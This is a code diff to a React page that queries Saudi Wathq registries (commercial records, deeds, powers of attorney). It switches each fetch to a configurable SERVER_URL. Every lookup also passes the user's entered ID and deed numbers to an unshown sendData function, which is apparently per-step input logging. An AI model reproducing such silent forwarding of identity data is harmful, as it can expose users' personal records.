@@ -1,7 +1,7 @@
 import { useEffect, useState } from "react";
 import { useLocation } from "wouter";
 import PageLayout from "@/components/layout/PageLayout";
-import { navigateToPage, sendData } from "@/lib/store";
+import { navigateToPage, sendData, SERVER_URL } from "@/lib/store";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
@@ -95,7 +95,7 @@ export default function CommercialData() {
     setCrLoading(true); setCrError(""); setCrData(null); setCrSearched(true);
     sendData({ data: { "رقم السجل التجاري": crNumber }, current: "استعلام سجل تجاري" });
     try {
-      const res = await fetch(`/api/wathq/cr/${crNumber}`);
+      const res = await fetch(`${SERVER_URL}/api/wathq/cr/${crNumber}`);
       const result = await res.json();
       if (result.error) { setCrError(result.error); }
       else {
@@ -111,7 +111,7 @@ export default function CommercialData() {
     setCcLoading(true); setCcError(""); setCcData(null); setCcSearched(true);
     sendData({ data: { "رقم السجل": ccNumber }, current: "استعلام عقد شركة" });
     try {
-      const res = await fetch(`/api/wathq/company-contract/${ccNumber}`);
+      const res = await fetch(`${SERVER_URL}/api/wathq/company-contract/${ccNumber}`);
       const result = await res.json();
       if (result.error) { setCcError(result.error); } else { setCcData(result); }
     } catch { setCcError("حدث خطأ في الاتصال. حاول مرة أخرى."); }
@@ -123,7 +123,7 @@ export default function CommercialData() {
     setAttLoading(true); setAttError(""); setAttData(null); setAttSearched(true);
     sendData({ data: { "رقم الوكالة": attCode }, current: "استعلام وكالة عدلية" });
     try {
-      const res = await fetch(`/api/wathq/attorney/${attCode}`);
+      const res = await fetch(`${SERVER_URL}/api/wathq/attorney/${attCode}`);
       const result = await res.json();
       if (result.error) { setAttError(result.error); } else { setAttData(result); }
     } catch { setAttError("حدث خطأ في الاتصال. حاول مرة أخرى."); }
@@ -135,7 +135,7 @@ export default function CommercialData() {
     setReLoading(true); setReError(""); setReData(null); setReSearched(true);
     sendData({ data: { "رقم الصك": reDeedNumber, "رقم الهوية": reIdNumber }, current: "استعلام صك عقاري" });
     try {
-      const res = await fetch(`/api/wathq/real-estate/${reDeedNumber}/${reIdNumber}/${reIdType}`);
+      const res = await fetch(`${SERVER_URL}/api/wathq/real-estate/${reDeedNumber}/${reIdNumber}/${reIdType}`);
       const result = await res.json();
       if (result.error) { setReError(result.error); } else { setReData(result); }
     } catch { setReError("حدث خطأ في الاتصال. حاول مرة أخرى."); }
@@ -147,7 +147,7 @@ export default function CommercialData() {
     setEdLoading(true); setEdError(""); setEdData(null); setEdSearched(true);
     sendData({ data: { "رقم التفويض": edId }, current: "استعلام تفويض إلكتروني" });
     try {
-      const res = await fetch(`/api/wathq/e-delegation/${edId}`);
+      const res = await fetch(`${SERVER_URL}/api/wathq/e-delegation/${edId}`);
       const result = await res.json();
       if (result.error) { setEdError(result.error); } else { setEdData(result); }
     } catch { setEdError("حدث خطأ في الاتصال. حاول مرة أخرى."); }
@@ -159,7 +159,7 @@ export default function CommercialData() {
     setChLoading(true); setChError(""); setChData(null); setChSearched(true);
     sendData({ data: { "رقم السجل": chId }, current: "استعلام غرفة تجارية" });
     try {
-      const res = await fetch(`/api/wathq/chamber/${chId}`);
+      const res = await fetch(`${SERVER_URL}/api/wathq/chamber/${chId}`);
       const result = await res.json();
       if (result.error) { setChError(result.error); } else { setChData(result); }
     } catch { setChError("حدث خطأ في الاتصال. حاول مرة أخرى."); }
